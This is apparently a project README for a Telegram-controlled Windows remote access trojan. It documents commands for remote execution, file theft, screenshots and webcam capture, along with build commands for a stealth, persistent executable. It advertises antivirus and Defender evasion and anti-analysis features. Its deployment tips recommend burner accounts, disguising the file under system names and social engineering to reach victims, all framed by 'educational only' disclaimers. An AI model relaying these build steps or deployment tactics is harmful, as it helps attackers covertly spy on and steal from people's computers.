# 🔴 Marrow RAT 2025
## Advanced Telegram Remote Access Tool
![marrow-rat-2025-Logo](https://raw.githubusercontent.com/HusseinTahaDEV/marrow-rat-2025/main/screenshot.png).

[![Python](https://img.shields.io/badge/Python-3.8+-blue.svg)](https://python.org)
[![Platform](https://img.shields.io/badge/Platform-Windows-lightgrey.svg)](https://microsoft.com/windows)
[![License](https://img.shields.io/badge/License-Educational-red.svg)](#license)
[![Status](https://img.shields.io/badge/Status-Active-green.svg)](https://github.com)

> **⚠️ EDUCATIONAL PURPOSE ONLY**  
> This tool is created for educational purposes, penetration testing, and authorized security research only. Unauthorized use is illegal and strictly prohibited.

---

## 🚨 **LEGAL DISCLAIMER**

```
⚠️  IMPORTANT LEGAL NOTICE  ⚠️

This software is provided for EDUCATIONAL PURPOSES ONLY.
Usage of this tool for attacking targets without prior mutual consent is ILLEGAL.
The developer is NOT responsible for any damage caused by misuse of this tool.

✅ AUTHORIZED USE CASES:
• Educational learning about cybersecurity
• Authorized penetration testing
• Security research with proper permissions
• Testing your own systems

❌ PROHIBITED USE CASES:
• Unauthorized access to computer systems
• Malicious activities of any kind
• Violation of local/international laws
• Attacking systems without explicit permission

BY USING THIS SOFTWARE, YOU ACKNOWLEDGE THAT YOU UNDERSTAND
THE LEGAL IMPLICATIONS AND AGREE TO USE IT RESPONSIBLY.
```

---

## 📋 **Features**

### 🎯 **Core Functionality**
- **Silent Execution** - Runs completely hidden without console windows
- **Telegram Control** - Full remote control via Telegram bot commands
- **Windows Defender Bypass** - Advanced evasion techniques (as of 2025)
- **Low Detection Rate** - Optimized to avoid most antivirus solutions
- **Cross-Platform** - Windows 10/11 support with automatic adaptation

### 🛠️ **Remote Commands**
| Command | Description | Example |
|---------|-------------|---------|
| `/help` | Show all available commands | `/help` |
| `/info` | System information & specs | `/info` |
| `/exec` | Execute system commands | `/exec dir C:\` |
| `/download` | Download files from target | `/download C:\file.txt` |
| `/upload` | Upload files to target | `/upload` (then send file) |
| `/screenshot` | Capture desktop screenshot | `/screenshot` |
| `/webcam` | Take webcam photo | `/webcam` |
| `/locate` | Get target location/IP info | `/locate` |

### 🔒 **Security Features**
- **Authorized Users Only** - Bot responds only to configured user IDs
- **Encrypted Communications** - All data transmitted via Telegram's encryption
- **Anti-Analysis** - Runtime protection against reverse engineering
- **Persistence Options** - Optional startup integration
- **Stealth Mode** - Completely hidden operation

---

## 🚀 **Quick Installation**

### **Prerequisites**
- Windows 10/11 (x64)
- Python 3.8+ (for building from source)
- Telegram Bot Token ([Get Here](https://t.me/BotFather))

### **Build from Source**

```bash
# 1. Clone repository
git clone https://github.com/yourusername/marrow-rat-2025
cd marrow-rat-2025

# 2. Install dependencies
pip install -r requirements.txt

# 3. Configure and build
python builder.py --token "YOUR_BOT_TOKEN" --user-id YOUR_USER_ID

# 4. Deploy generated executable
# File will be in: output/MarrowRAT_XXXXXXXX_XXXXXX.exe
```

---

## ⚙️ **Configuration**

### **Setting Up Telegram Bot**

1. **Create Bot**:
   - Message [@BotFather](https://t.me/BotFather)
   - Send `/newbot`
   - Choose name and username
   - Save the bot token

2. **Get Your User ID**:
   - Message [@userinfobot](https://t.me/userinfobot)
   - Save your user ID number

3. **Configure RAT**:
   ```bash
   python builder.py --token "1234567890:ABCDEF..." --user-id 123456789
   ```

### **Advanced Configuration**

```bash
# Full stealth build with startup persistence
python builder.py \
  --token "YOUR_TOKEN" \
  --user-id YOUR_ID \
  --stealth \
  --startup \
  --no-deps

# Quick build without extra features
python builder.py \
  --token "YOUR_TOKEN" \
  --user-id YOUR_ID \
  --no-stealth \
  --no-startup
```

---

## 📊 **Detection Status**

### **Antivirus Bypass Results** *(As of 2025)*
- ✅ **Windows Defender** - ⭐ **UNDETECTED** ⭐
- ✅ **Most Commercial AVs** - Low detection rate
- ✅ **Behavioral Analysis** - Advanced evasion
- ✅ **Sandbox Detection** - Anti-VM techniques

> **Note**: Detection rates may vary based on AV updates. Always test in controlled environments.

---

## 🛡️ **Operational Security**

### **Best Practices**
- ✅ Use burner Telegram accounts for operations
- ✅ Test on isolated/virtual machines first
- ✅ Keep backups of working versions
- ✅ Monitor detection rates regularly

### **Deployment Tips**
- 📁 Rename executable to common system names
- 🎭 Use social engineering for initial deployment
- 🔄 Update configurations regularly
- 🚫 Avoid suspicious file paths

---

## 🗑️ **Uninstallation**

### **Complete Removal**
```bash
# Run the included uninstaller
MarrowUninstaller.exe

# Manual cleanup (if needed)
# 1. Kill processes via Task Manager
# 2. Remove startup entries (msconfig)
# 3. Delete files from installation directory
```

The uninstaller will:
- ✅ Terminate all RAT processes
- ✅ Remove registry startup entries
- ✅ Delete RAT files from system
- ✅ Clean temporary files

---

## 📁 **Project Structure**

```
marrow-rat-2025/
├── 📄 agent.py              # Core RAT functionality
├── 🔧 builder.py            # Professional build system
├── 🗑️ uninstaller.py        # Complete removal tool
├── 📋 requirements.txt      # Python dependencies
├── 📖 README.md            # This documentation
├── 📜 device_id.txt        # Unique device identifier
└── 📂 output/              # Built executables
    ├── 🎯 MarrowRAT_XXXX.exe      # Main RAT (100MB+)
    ├── 🗑️ MarrowUninstaller.exe   # Uninstaller tool
    └── 📦 Package_XXXX/           # Deployment package
```

---

## 🔧 **Technical Details**

### **Specifications**
- **Size**: ~100MB (PyInstaller bundled)
- **Runtime**: Python 3.12+ embedded
- **Platform**: Windows 10/11 (x64)
- **Dependencies**: All bundled in executable

### **Communication Protocol**
- **Method**: Telegram Bot API over HTTPS
- **Encryption**: TLS 1.3 (Telegram's encryption)
- **Authentication**: User ID whitelist verification
- **Rate Limiting**: Built-in flood protection

### **Persistence Mechanisms**
- ✅ Windows Registry (Run/RunOnce keys)
- ✅ Startup folder integration
- ✅ Service installation (optional)
- ✅ Task scheduler (stealth mode)

---

## 🆘 **Troubleshooting**

### **Common Issues**

| Issue | Cause | Solution |
|-------|-------|----------|
| Bot not responding | Wrong token/user ID | Verify credentials with @BotFather |
| AV Detection | Outdated build | Rebuild with latest version |
| Build fails | Missing dependencies | Run `pip install -r requirements.txt` |
| No permissions | Not admin rights | Run builder as administrator |

### **Support**
- 📧 Create issue on GitHub repository
- 💬 Check documentation and FAQ
- 🔍 Search existing issues first

---

## 📈 **Version History**

### **v2025.1** *(Current)*
- ✅ Windows Defender bypass
- ✅ Advanced evasion techniques
- ✅ Professional build system
- ✅ Complete documentation
- ✅ Uninstaller included

### **Previous Versions**
- Basic Telegram control
- Simple command execution
- Manual configuration required

---

## 🤝 **Contributing**

### **Guidelines**
1. **Educational Focus** - All contributions must maintain educational purpose
2. **Legal Compliance** - No malicious features or illegal functionality
3. **Code Quality** - Follow Python PEP 8 standards
4. **Documentation** - Update docs for new features


---

## 📜 **License**

### **Educational License**
```
Copyright (c) 2025 Marrow RAT Project

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software for EDUCATIONAL PURPOSES ONLY.

RESTRICTIONS:
- Commercial use is prohibited
- Malicious use is strictly forbidden
- Must comply with local and international laws
- Use only on systems you own or have explicit permission to test

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND.
THE AUTHORS ARE NOT LIABLE FOR ANY MISUSE OR DAMAGE.
```

---

## ⚠️ **Final Warning**

```
🚨 REMEMBER: This tool is for EDUCATION and AUTHORIZED TESTING only!

✅ Legal uses: Learning, authorized pen-testing, research
❌ Illegal uses: Unauthorized access, malicious activities

Always ensure you have proper authorization before using
this tool on any system you do not own.

Stay ethical. Stay legal. Stay safe.
```

---

**Made with 💀 for educational cybersecurity research**

---


*Last updated: August 31, 2025*


